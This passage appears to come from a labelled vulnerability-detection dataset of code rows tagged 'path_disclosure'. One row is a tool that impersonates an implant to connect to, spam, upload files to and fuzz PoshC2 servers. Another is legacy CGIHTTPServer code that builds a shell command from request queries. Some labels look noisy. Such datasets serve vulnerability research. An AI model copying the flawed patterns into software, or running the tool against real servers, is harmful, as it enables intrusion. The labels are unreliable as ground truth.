      self.key = base64.b64encode( c )
      self.secondstage( secondstage )

        

def main():
  
  # Command line options
  parser = argparse.ArgumentParser(description=""Find, monitor and troll a PoshC2 server"")
  parser.add_argument(""-a"", ""--analyse"", help=""Analyse an implant payload to discover C2 server"")
  parser.add_argument(""-k"", ""--key"", help=""Comms encryption key"" )
  parser.add_argument(""-U"", ""--useragent"", help=""User-agent string"" )
  parser.add_argument(""-r"", ""--referer"", help=""Referer string"" )
  parser.add_argument(""-H"", ""--host"", help=""Host name to connect to"" )
  parser.add_argument(""-g"", ""--hostheader"", help=""Host header for domain fronted servers"")
  parser.add_argument(""-d"", ""--domain"", default='WORKGROUP', help=""Windows domain name to claim to be in"")
  parser.add_argument(""-u"", ""--user"", default='user', help=""Windows user to claim to be connecting as"")
  parser.add_argument(""-m"", ""--machine"", default='DESKTOP', help=""Machine hostname to claim to be connecting as"")
  parser.add_argument(""--connect"", action='store_true', help=""Connect to the C2 as a new implant then quit"")
  parser.add_argument(""--watch"", action='store_true', help=""Connect and monitor commands as they come in"")

  parser.add_argument(""--spam"", metavar=""TEXTFILE"", help=""Spam the connected implants screen with content from this text file"")
  parser.add_argument(""--rickroll"", action='store_true', help=""Spam with the entire lyrics to Never Gonna Give You Up"")
  parser.add_argument(""--upload"", nargs=2, help=""Upload a file to the C2 server (NOTE: this writes data from the local file to the remote file in APPEND mode)"")
  parser.add_argument(""--fuzz"", action='store_true', help=""Fuzz with random bytes"")
  if len( sys.argv)==1:
    parser.print_help()
    sys.exit(1)
  args = parser.parse_args()

  if args.analyse:
    payload = PoshC2Payload( args.analyse )   
    c2 = payload.analyse()
    secondstage = payload.secondstage
  else:
    c2 = PoshC2Server()
    c2.useragent = args.useragent
    c2.referer = args.referer
    c2.key = args.key
    c2.host = args.host
  c2.domain = args.domain
  c2.username = args.user
  c2.machine = args.machine

  if args.connect:
    c2.secondstage( secondstage )
    return True

  if args.watch:
    c2.secondstage( secondstage, interact=True )
    return True

  if args.rickroll:
    c2.rickroll( payload.secondstage )
    return True

  if args.upload:
    c2.secondstage( secondstage )
    c2.uploadfile( args.upload[0], args.upload[1] ) 

  if args.fuzz:
    c2.fuzz( secondstage )

if __name__ == ""__main__"":
  main()
/n/n/n",1,path_disclosure
20,64,656f459e53a177aeabfb96f00e6b8f4a28f87c98,"tests/test_bw2_disclosure.py/n/nimport os
import brightway2 as bw2
from fixtures import *

from lca_disclosures.brightway2.disclosure import Bw2Disclosure as DisclosureExporter
from lca_disclosures.brightway2.importer import DisclosureImporter

def test_attributes():

    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)

    assert de.foreground_flows
    assert de.background_flows
    assert de.emission_flows
    assert de.Af
    assert de.Ad
    assert de.Bf
    assert de.cutoffs


def test_bw2_disclosure():
    
    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)

    disclosure_file = de.write_json()

    print (os.path.realpath(disclosure_file))

    assert os.path.isfile(disclosure_file)

    bw2.projects.set_current(IMPORT_PROJECT_NAME)

    di = DisclosureImporter(disclosure_file)

    di.apply_strategies()

    assert di.statistics()[2] == 0

    di.write_database()

    assert len(bw2.Database(di.db_name)) != 0
/n/n/n",0,path_disclosure
21,65,656f459e53a177aeabfb96f00e6b8f4a28f87c98,"/tests/test_bw2_disclosure.py/n/nimport os
import brightway2 as bw2
from fixtures import *

from lca_disclosures.brightway2.disclosure import Bw2Disclosure as DisclosureExporter
from lca_disclosures.brightway2.importer import DisclosureImporter

def test_attributes():

    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)

    assert de.foreground_flows
    assert de.background_flows
    assert de.emission_flows
    assert de.Af
    assert de.Ad
    assert de.Bf
    assert de.cutoffs


def test_bw2_disclosure():
    
    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)

    disclosure_file = de.write_json()

    print (disclosure_file)

    assert os.path.isfile(disclosure_file)

def test_bw2_import():

    bw2.projects.set_current(IMPORT_PROJECT_NAME)

    di = DisclosureImporter(os.path.join(os.path.dirname(os.path.realpath(__file__)), TEST_FOLDER, ""{}.json"".format(TEST_FILENAME)))

    di.apply_strategies()

    assert di.statistics()[2] == 0

    di.write_database()

    assert len(bw2.Database(di.db_name)) != 0
/n/n/n",1,path_disclosure
22,42,31ab237dacb201a31b16de76ffd7449873cb18d8,"hybrid/package_info.py/n/n# Copyright 2018 D-Wave Systems Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

__packagename__ = 'dwave-hybrid'
__title__ = 'D-Wave Hybrid'
__version__ = '0.2.0'
__author__ = 'D-Wave Systems Inc.'
__authoremail__ = 'radomir@dwavesys.com'
__description__ = 'Hybrid Asynchronous Decomposition Solver Framework'
__url__ = 'https://github.com/dwavesystems/dwave-hybrid'
__license__ = 'Apache 2.0'
__copyright__ = '2018, D-Wave Systems Inc.'
/n/n/n",0,path_disclosure
23,43,31ab237dacb201a31b16de76ffd7449873cb18d8,"/hybrid/package_info.py/n/n# Copyright 2018 D-Wave Systems Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

__packagename__ = 'dwave-hybrid'
__title__ = 'D-Wave Hybrid'
__version__ = '0.1.4'
__author__ = 'D-Wave Systems Inc.'
__authoremail__ = 'radomir@dwavesys.com'
__description__ = 'Hybrid Asynchronous Decomposition Solver Framework'
__url__ = 'https://github.com/dwavesystems/dwave-hybrid'
__license__ = 'Apache 2.0'
__copyright__ = '2018, D-Wave Systems Inc.'
/n/n/n",1,path_disclosure
24,88,b0214dec06089bd9f45b028f3b69ed5dc29df204,"tests/graph_test.py/n/nimport unittest
from src.graph import *


test_offers = [{
  'offers': [
    {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}
  ],
  'want': 'Chaos',
  'have': 'Alteration',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},
    {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}
  ],
  'want': 'Chaos',
  'have': 'Chromatic',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},
    {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}
  ],
  'want': 'Alteration',
  'have': 'Chaos',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},
    {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}
  ],
    'want': 'Alteration',
    'have': 'Chromatic',
    'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},
    {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}
  ],
  'want': 'Chromatic',
  'have': 'Chaos',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
  ],
  'want': 'Chromatic',
  'have': 'Alteration',
  'league': 'Abyss'
}]

expected_graph = {
  'Chaos': {
    'Alteration': [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},
      {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}
    ],
    'Chromatic': [
      {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},
      {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}
    ]
  },
  'Alteration': {
    'Chaos': [
      {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}
    ],
    'Chromatic': [
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
    ]
  },
  'Chromatic': {
    'Chaos': [
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}
    ],
    'Alteration': [
      {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},
      {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}
    ]
  }
}



### Below structures are modified for simpler testing => number reduced, offers slightly changed


# Exptected graph when trading from Chaos to Chaos over one other currency
expected_graph_small = {
  'Chaos': {
    'Alteration': [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100}
    ]
  },
  'Alteration': {
    'Chromatic': [
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
    ]
  },
  'Chromatic': {
    'Chaos': [
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200}
    ]
  }
}

# Expected paths from Chaos to Chaos
def expected_paths_small_same_currency():
  return [
    [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}
    ]
  ]

def expected_profitable_paths_small_same_currency():
  return []


# Expected paths from Chaos to Chromatics
# This is not really relevant to us, since we only care about trade paths between the same currency in order to
# guarantee easily comparable results. However, it's good to make sure that the path exploration also works for this
# edge case
expected_profitable_paths_small_different_currency = [
  [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'}
  ], [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'}
  ]
]


expected_conversion = {
  ""from"": ""Chaos"",
  ""to"": ""Chaos"",
  ""starting"": 8,
  ""ending"": 5,
  ""winnings"": -3,
  ""transactions"": [{
    ""contact_ign"": ""wreddnuy"",
    ""from"": ""Chaos"",
    ""to"": ""Alteration"",
    ""paid"": 8,
    ""received"": 96,
    ""conversion_rate"": 12.0
  }, {
    ""contact_ign"": ""Shioua_ouah"",
    ""from"": ""Alteration"",
    ""to"": ""Chromatic"",
    ""paid"": 96,
    ""received"": 66,
    ""conversion_rate"": 0.6897
  }, {
    ""contact_ign"": ""MVP_Kefir"",
    ""from"": ""Chromatic"",
    ""to"": ""Chaos"",
    ""paid"": 66,
    ""received"": 5,
    ""conversion_rate"": 0.087
  }]
}


class GraphTest(unittest.TestCase):
  def test_build_graph(self):
    graph = build_graph(test_offers)
    self.assertDictEqual(graph, expected_graph)

  def test_find_paths(self):
    paths_small_same_currency = find_paths(expected_graph_small, 'Chaos', 'Chaos')
    self.assertListEqual(expected_profitable_paths_small_same_currency(), paths_small_same_currency)
    paths_small_different_currency = find_paths(expected_graph_small.copy(), 'Chaos', 'Chromatic')
    self.assertListEqual(expected_profitable_paths_small_different_currency, paths_small_different_currency)

  def test_is_profitable(self):
    path = expected_paths_small_same_currency()[0]
    self.assertEqual(False, is_profitable(path))

  def test_build_conversions(self):
    path = expected_paths_small_same_currency()[0]
    conversion = build_conversion(path)
    print(conversion)
    self.assertDictEqual(expected_conversion, conversion)

  def test_stock_equalization(self):
    pass
/n/n/n",0,path_disclosure
25,89,b0214dec06089bd9f45b028f3b69ed5dc29df204,"/tests/graph_test.py/n/nimport unittest
from src.graph import *


test_offers = [{
  'offers': [
    {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}
  ],
  'want': 'Chaos',
  'have': 'Alteration',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},
    {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}
  ],
  'want': 'Chaos',
  'have': 'Chromatic',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},
    {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}
  ],
  'want': 'Alteration',
  'have': 'Chaos',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},
    {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}
  ],
    'want': 'Alteration',
    'have': 'Chromatic',
    'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},
    {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}
  ],
  'want': 'Chromatic',
  'have': 'Chaos',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
  ],
  'want': 'Chromatic',
  'have': 'Alteration',
  'league': 'Abyss'
}]

expected_graph = {
  'Chaos': {
    'Alteration': [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},
      {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}
    ],
    'Chromatic': [
      {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},
      {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}
    ]
  },
  'Alteration': {
    'Chaos': [
      {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}
    ],
    'Chromatic': [
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
    ]
  },
  'Chromatic': {
    'Chaos': [
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}
    ],
    'Alteration': [
      {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},
      {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}
    ]
  }
}



### Below structures are modified for simpler testing => number reduced, offers slightly changed


# Exptected graph when trading from Chaos to Chaos over one other currency
expected_graph_small = {
  'Chaos': {
    'Alteration': [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100}
    ]
  },
  'Alteration': {
    'Chromatic': [
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
    ]
  },
  'Chromatic': {
    'Chaos': [
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200}
    ]
  }
}

# Expected paths from Chaos to Chaos
def expected_paths_small_same_currency():
  return [
    [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}
    ]
  ]


# Expected paths from Chaos to Chromatics
# This is not really relevant to us, since we only care about trade paths between the same currency in order to
# guarantee easily comparable results. However, it's good to make sure that the path exploration also works for this
# edge case
expected_paths_small_different_currency = [
  [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'}
  ], [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'}
  ]
]


expected_conversion = {
  ""from"": ""Chaos"",
  ""to"": ""Chaos"",
  ""starting"": 8,
  ""ending"": 5,
  ""winnings"": -3,
  ""transactions"": [{
    ""contact_ign"": ""wreddnuy"",
    ""from"": ""Chaos"",
    ""to"": ""Alteration"",
    ""paid"": 8,
    ""received"": 96
  }, {
    ""contact_ign"": ""Shioua_ouah"",
    ""from"": ""Alteration"",
    ""to"": ""Chromatic"",
    ""paid"": 96,
    ""received"": 66
  }, {
    ""contact_ign"": ""MVP_Kefir"",
    ""from"": ""Chromatic"",
    ""to"": ""Chaos"",
    ""paid"": 66,
    ""received"": 5
  }]
}


class GraphTest(unittest.TestCase):
  def test_build_graph(self):
    graph = build_graph(test_offers)
    self.assertDictEqual(graph, expected_graph)

  def test_find_paths(self):
    paths_small_same_currency = find_paths(expected_graph_small, 'Chaos', 'Chaos')
    self.assertListEqual(expected_paths_small_same_currency(), paths_small_same_currency)
    paths_small_different_currency = find_paths(expected_graph_small.copy(), 'Chaos', 'Chromatic')
    self.assertListEqual(expected_paths_small_different_currency, paths_small_different_currency)

  def test_is_profitable(self):
    path = expected_paths_small_same_currency()[0]
    self.assertEqual(False, is_profitable(path))

  def test_build_conversions(self):
    path = expected_paths_small_same_currency()[0]
    conversion = build_conversion(path)
    print(conversion)
    self.assertDictEqual(expected_conversion, conversion)
/n/n/n",1,path_disclosure
26,8,923ba361d8f757f0656cfd216525aca4848e02aa,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
